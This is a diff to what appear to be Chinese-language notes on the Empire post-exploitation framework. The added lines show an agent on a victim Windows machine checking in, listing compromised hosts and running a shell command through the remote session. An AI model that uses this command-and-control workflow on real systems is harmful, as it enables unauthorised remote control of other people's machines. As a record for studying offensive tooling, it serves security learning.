@@ -65,5 +65,20 @@ execute			# set生效，生成木马文件
 [+] Initial agent NCU84961 from 10.203.87.61 now active (Slack)
 [*] Sending agent (stage 2) to NCU84961 at 10.203.87.61
 
-# 会显示
+# 会显示被攻击级器的IP
+
+(Empire: listeners) > agents
+
+[*] Active agents:
+
+ Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen
+ ----     -- -----------     ------------      --------                -------            ---    -----    ---------
+ NCU84961 ps 192.168.11.1    DESKTOP-S8B7MSP   DESKTOP-S8B7MSP\R-web   powershell         1968   5/0.0    2019-05-03 17:59:53
+
+(Empire: agents) > interact NCU84961
+(Empire: NCU84961) > dir
+[*] Tasked NCU84961 to run TASK_SHELL
+[*] Agent NCU84961 tasked with task ID 1
+(Empire: NCU84961) > [*] Agent NCU84961 returned results.
+
 ```
